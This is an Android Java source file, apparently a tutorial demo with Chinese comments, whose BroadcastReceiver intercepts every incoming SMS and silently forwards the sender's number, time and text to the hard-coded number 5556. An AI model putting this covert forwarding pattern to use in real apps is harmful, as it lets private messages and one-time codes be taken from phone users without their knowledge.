package org.lxh.demo;

import java.text.SimpleDateFormat;
import java.util.Date;

import android.app.PendingIntent;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.telephony.SmsManager;
import android.telephony.SmsMessage;

public class SMSBroadcastReceiver extends BroadcastReceiver {

	@Override
	public void onReceive(Context context, Intent intent) {
		Object[] pdusData = (Object[]) intent.getExtras().get("pdus"); // 取得全部短信的内容
		for (int x = 0; x < pdusData.length; x++) {
			byte[] pdus = (byte[]) pdusData[x];	// 取出一条完整的短信
			SmsMessage msg = SmsMessage.createFromPdu(pdus);
			String messageBody = msg.getMessageBody() ;	// 信息数据
			String phoneNumber = msg.getOriginatingAddress(); // 取得地址
			String receiveData = new SimpleDateFormat("yyyy-MM-dd hh:mm:ss.SSS")
					.format(new Date(msg.getTimestampMillis()));
			SmsManager smsManager = SmsManager.getDefault() ;
			PendingIntent sentIntent = PendingIntent.getActivity(context, 0,
					intent, PendingIntent.FLAG_UPDATE_CURRENT);
			String content = "短信号码：" + phoneNumber + "\n发送时间：" + receiveData
					+ "\n短信内容：（" + messageBody + "）";
			System.out.println(content) ;
			smsManager.sendTextMessage("5556", null, content, sentIntent, null) ; 
		}
	}

}
